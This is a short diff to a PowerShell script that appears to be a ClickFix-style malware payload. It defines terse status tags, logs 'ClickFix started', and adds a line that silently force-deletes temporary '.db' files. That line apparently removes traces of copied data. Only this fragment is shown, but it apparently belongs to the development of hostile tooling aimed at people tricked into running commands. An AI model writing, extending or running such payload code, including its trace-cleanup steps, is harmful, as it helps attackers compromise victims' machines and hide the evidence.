@@ -18,6 +18,7 @@ $R = "[+]"; $PC = "[i]"; $LK = "[k]"; $KY = "[k]"; $GL = "[w]"
 $RB = "[g]"; $GM = "[d]"; $WF = "[n]"; $CK = "[v]"; $XX = "[x]"
 $WA = "[!]"
 
+Remove-Item "$env:TEMP\db_*.db" -Force -ErrorAction SilentlyContinue
 ts "$R ClickFix started"
 
 try {
